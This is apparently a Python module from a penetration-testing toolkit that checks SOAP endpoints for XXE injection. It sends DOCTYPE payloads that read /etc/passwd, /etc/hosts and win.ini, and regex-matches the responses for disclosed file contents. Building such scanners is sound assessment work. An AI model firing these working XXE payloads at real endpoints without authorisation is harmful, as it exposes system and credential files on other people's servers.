import re
from ptlibs.ptprinthelper import ptprint

__TESTLABEL__ = "SOAP XXE assessment"


PASSWD_LINE_RE = re.compile(
    r"^[a-z_][a-z0-9_\-]{0,31}:(?:[x*!]|\$\d\$[^:]*|):\d{1,6}:\d{1,6}:[^:]*:[^:]*:[^:\s]*$",
    re.MULTILINE,
)

SHADOW_LINE_RE = re.compile(
    r"^[a-z_][a-z0-9_\-]{0,31}:(?:\$\d\$|\*|!|::)",
    re.MULTILINE,
)

HOSTS_FILE_RE = re.compile(
    r"^\d{1,3}(?:\.\d{1,3}){3}\s+[a-z0-9_.\-]+",
    re.MULTILINE | re.IGNORECASE,
)

WIN_INI_RE = re.compile(
    r"\[(?:fonts|extensions|mci\s+extensions|files|mail|drivers|intl|colors|desktop)\][\s\S]{0,400}?=",
    re.IGNORECASE,
)

DTD_DISABLED_INDICATORS = [
    "doctype is disallowed",
    "dtd prohibited",
    "dtd is not allowed",
    "doctype is prohibited",
    "prohibits the use of dtd",
    "doctype declaration not allowed",
]

ENTITIES_BLOCKED_INDICATORS = [
    "external entity disabled",
    "entity resolution forbidden",
    "external general entities",
    "external entities are not allowed",
    "external entity references are forbidden",
    "no_network",
    "network access disabled",
]

ENTITY_UNRESOLVED_INDICATORS = [
    "entity not defined",
    "undeclared entity",
    "entity is not defined",
    "undefined entity",
    "could not resolve entity",
    "failed to load external entity",
]

PARSER_ERROR_INDICATORS = [
    "xml parse error",
    "not well-formed",
    "xml syntax error",
    "xmlsyntaxerror",
    "saxparseexception",
    "premature end",
    "expat",
    "unclosed token",
]


class XXETest:
    def __init__(self, args, ptjsonlib, helpers, http_client, common_tests):
        self.args = args
        self.ptjsonlib = ptjsonlib
        self.helpers = helpers
        self.http_client = http_client
        self.common_tests = common_tests
        self.helpers.print_header(__TESTLABEL__)

    def _normalize_evidence(self, text, limit=180):
        if not text:
            return ""
        norm = re.sub(r"\s+", " ", text).strip()
        norm = re.sub(r"[\x00-\x08\x0b-\x1f\x7f]", "", norm)
        if len(norm) > limit:
            norm = norm[:limit] + "..."
        return norm

    def _default_value(self, param_type):
        if param_type == "string":
            return "test"
        if param_type in ("int", "integer", "long", "short"):
            return "1"
        if param_type in ("decimal", "float", "double"):
            return "1.0"
        if param_type == "boolean":
            return "true"
        return "test"

    def _pick_string_injection_target(self):
        operations = getattr(self.helpers, "parsed_operations", []) or []

        for op in operations:
            if not op.get("name"):
                continue
            for p in op.get("input_params", []):
                if p.get("type") == "string" and p.get("name"):
                    return op, p["name"]

        for op in operations:
            if op.get("name") and op.get("input_params"):
                first_p = op["input_params"][0]
                if first_p.get("name"):
                    return op, first_p["name"]

        return None, None

    def _build_valid_request(self):
        operations = getattr(self.helpers, "parsed_operations", []) or []

        for op in operations:
            if op.get("name"):
                return self._build_op_request(
                    op,
                    inject_param=None,
                    injected_value=None,
                    doctype_block="",
                )

        return (
            '<?xml version="1.0"?>'
            '<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">'
            '<soapenv:Body><message>xxe_baseline</message></soapenv:Body>'
            '</soapenv:Envelope>'
        )

    def _build_op_request(self, op, inject_param, injected_value, doctype_block):
        tns = getattr(self.helpers, "target_namespace", "") or "http://tempuri.org/"
        input_element = op.get("input_element", op.get("name", ""))
        params = op.get("input_params", []) or []

        params_xml = ""

        for p in params:
            p_name = p.get("name", "")
            p_type = p.get("type", "string")

            if not p_name:
                continue

            if inject_param and p_name == inject_param and injected_value is not None:
                params_xml += f"<tns:{p_name}>{injected_value}</tns:{p_name}>"
            else:
                params_xml += (
                    f"<tns:{p_name}>"
                    f"{self._default_value(p_type)}"
                    f"</tns:{p_name}>"
                )

        return (
            f'<?xml version="1.0"?>{doctype_block}'
            f'<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/" '
            f'xmlns:tns="{tns}">'
            f'<soap:Body>'
            f'<tns:{input_element}>{params_xml}</tns:{input_element}>'
            f'</soap:Body>'
            f'</soap:Envelope>'
        )

    def _build_generic_request(self, doctype_block, injected_value):
        return (
            f'<?xml version="1.0"?>{doctype_block}'
            f'<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">'
            f'<soapenv:Body><message>{injected_value}</message></soapenv:Body>'
            f'</soapenv:Envelope>'
        )

    def _inject_xxe_payload(self, doctype_block, entity_ref):
        op, param_name = self._pick_string_injection_target()

        if op and param_name:
            return self._build_op_request(
                op,
                param_name,
                entity_ref,
                doctype_block,
            )

        return self._build_generic_request(doctype_block, entity_ref)
    
    def _payload_display_name(self, label):
        mapping = {
            "general_entity_passwd_unix": "general entity",
            "general_entity_passwd_unix_url": "general entity with file:/ URI",
            "general_entity_hosts_unix": "general entity",
            "general_entity_winini": "general entity",
            "nested_entity_passwd_unix": "nested entity",
            "parameter_entity_passwd_unix": "parameter entity",
        }
        return mapping.get(label, label)

    def _xxe_payloads(self):
        passwd_indicators = [PASSWD_LINE_RE, SHADOW_LINE_RE]
        hosts_indicators = [HOSTS_FILE_RE]
        win_indicators = [WIN_INI_RE]

        return [
            {
                "label": "general_entity_passwd_unix",
                "target": "/etc/passwd",
                "envelope": self._inject_xxe_payload(
                    '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>',
                    "&xxe;",
                ),
                "expect_regexes": passwd_indicators,
                "expect_strings": ["root:x:"],
            },
            {
                "label": "general_entity_passwd_unix_url",
                "target": "/etc/passwd",
                "envelope": self._inject_xxe_payload(
                    '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:/etc/passwd">]>',
                    "&xxe;",
                ),
                "expect_regexes": passwd_indicators,
                "expect_strings": ["root:x:"],
            },
            {
                "label": "general_entity_hosts_unix",
                "target": "/etc/hosts",
                "envelope": self._inject_xxe_payload(
                    '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hosts">]>',
                    "&xxe;",
                ),
                "expect_regexes": hosts_indicators,
                "expect_strings": ["localhost"],
            },
            {
                "label": "general_entity_winini",
                "target": "C:\\Windows\\win.ini",
                "envelope": self._inject_xxe_payload(
                    '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini">]>',
                    "&xxe;",
                ),
                "expect_regexes": win_indicators,
                "expect_strings": ["[fonts]", "[extensions]"],
            },
            {
                "label": "nested_entity_passwd_unix",
                "target": "/etc/passwd",
                "envelope": self._inject_xxe_payload(
                    '<!DOCTYPE foo ['
                    '<!ENTITY a "level1">'
                    '<!ENTITY b "&a;&a;">'
                    '<!ENTITY xxe SYSTEM "file:///etc/passwd">'
                    ']>',
                    "&xxe;&b;",
                ),
                "expect_regexes": passwd_indicators,
                "expect_strings": ["root:x:"],
            },
            {
                "label": "parameter_entity_passwd_unix",
                "target": "/etc/passwd",
                "envelope": self._inject_xxe_payload(
                    '<!DOCTYPE foo ['
                    '<!ENTITY % pe SYSTEM "file:///etc/passwd">'
                    '<!ENTITY xxe "%pe;">'
                    ']>',
                    "&xxe;",
                ),
                "expect_regexes": passwd_indicators,
                "expect_strings": ["root:x:"],
            },
        ]

    def _has_any(self, text, indicators):
        if not text:
            return False, None

        low = text.lower()

        for ind in indicators:
            if ind in low:
                return True, ind

        return False, None

    def _classify_parser_behavior(self, response):
        if response is None:
            return "uncertain"

        body = response.text or ""

        hit, _ = self._has_any(body, DTD_DISABLED_INDICATORS)
        if hit:
            return "dtd_disabled"

        hit, _ = self._has_any(body, ENTITIES_BLOCKED_INDICATORS)
        if hit:
            return "external_entities_blocked"

        hit, _ = self._has_any(body, ENTITY_UNRESOLVED_INDICATORS)
        if hit:
            return "entity_unresolved"

        hit, _ = self._has_any(body, PARSER_ERROR_INDICATORS)
        if hit:
            return "parser_error"

        return "uncertain"

    def _detect_file_disclosure(self, body, payload):
        if not body:
            return None

        for ind in payload.get("expect_strings", []):
            if ind.lower() in body.lower():
                for regex in payload.get("expect_regexes", []):
                    m = regex.search(body)
                    if m:
                        return {
                            "kind": "structured_file_disclosure",
                            "evidence": self._normalize_evidence(m.group(0)),
                        }

                return {
                    "kind": "file_disclosure_substring",
                    "evidence": self._normalize_evidence(ind),
                }

        for regex in payload.get("expect_regexes", []):
            m = regex.search(body)
            if m:
                return {
                    "kind": "structured_file_disclosure",
                    "evidence": self._normalize_evidence(m.group(0)),
                }

        return None

    def _analyse_response(self, payload, response):
        result = {
            "label": payload["label"],
            "target": payload["target"],
            "fileDisclosure": None,
            "parserBehavior": "uncertain",
        }

        if response is None:
            return result

        body = response.text or ""

        disclosure = self._detect_file_disclosure(body, payload)
        if disclosure:
            result["fileDisclosure"] = disclosure

        result["parserBehavior"] = self._classify_parser_behavior(response)

        return result

    def run(self):
        baseline = self.helpers.send_soap_request(data=self._build_valid_request())
        _ = baseline

        confirmed_findings = []
        parser_behaviours = []

        seen_targets = set()

        for payload in self._xxe_payloads():
            response = self.helpers.send_soap_request(data=payload["envelope"])
            result = self._analyse_response(payload, response)

            parser_behaviours.append(result["parserBehavior"])

            disclosure = result.get("fileDisclosure")
            if disclosure:
                target = result["target"]

                if target in seen_targets:
                    continue

                seen_targets.add(target)

                payload_name = self._payload_display_name(result["label"])

                confirmed_findings.append({
                    "payload": result["label"],
                    "payloadType": payload_name,
                    "target": target,
                    "kind": disclosure["kind"],
                    "evidence": disclosure["evidence"],
                    "message": (
                        f"{target} disclosed via {payload_name} "
                        f"({result['label']}). Evidence: {disclosure['evidence']}"
                    ),
                })

        if confirmed_findings:
            ptprint(
                "XXE vulnerability confirmed.",
                "VULN",
                not self.args.json,
                indent=4,
                colortext=True,
            )

            for finding in confirmed_findings:
                ptprint(
                    f"  {finding['message']}",
                    "VULN",
                    not self.args.json,
                    indent=4,
                )

            evidence = " || ".join(
                f"{f['target']}: {f['evidence']}"
                for f in confirmed_findings
            )

            self.ptjsonlib.add_vulnerability(
                "PTV-SOAP-XXE",
                node_key=self.helpers.node_key,
                data={
                    "summary": "SOAP XXE vulnerability confirmed.",
                    "description": (
                        "The SOAP endpoint expanded external XML entities and "
                        "returned local file content in the response."
                    ),
                    "confidence": "direct file disclosure evidence",
                    "findingCount": len(confirmed_findings),
                    "findings": confirmed_findings,
                    "evidence": evidence,
                },
            )
            return

        blocked_count = sum(
            1 for behaviour in parser_behaviours
            if behaviour in (
                "dtd_disabled",
                "external_entities_blocked",
                "entity_unresolved",
            )
        )

        if blocked_count:
            ptprint(
                "No SOAP XXE file disclosure detected; tested external entities appear blocked.",
                "OK",
                not self.args.json,
                indent=4,
            )
        else:
            ptprint(
                "No SOAP XXE file disclosure detected.",
                "OK",
                not self.args.json,
                indent=4,
            )


def run(args, ptjsonlib, helpers, http_client, common_tests):
    XXETest(args, ptjsonlib, helpers, http_client, common_tests).run()